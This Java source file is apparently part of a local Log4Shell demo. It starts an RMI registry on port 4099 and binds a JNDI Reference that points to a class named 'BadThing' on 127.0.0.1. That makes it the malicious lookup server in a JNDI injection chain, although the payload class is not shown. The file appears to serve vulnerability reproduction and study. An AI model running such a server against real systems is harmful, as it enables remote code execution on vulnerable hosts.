package com.example.demolog4j;


import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @Author: zw
 * @Date: 2021/12/13 13:05
 */
public class RMIServer {
	public static void main(String[] args) throws Exception {
		LocateRegistry.createRegistry(4099);
		Registry registry=LocateRegistry.getRegistry();
		Reference reference=new Reference("com.example.demolog4j.BadThing","com.example.demolog4j.BadThing","127.0.0.1");
		ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
		registry.bind("badThing",referenceWrapper);
	}
}
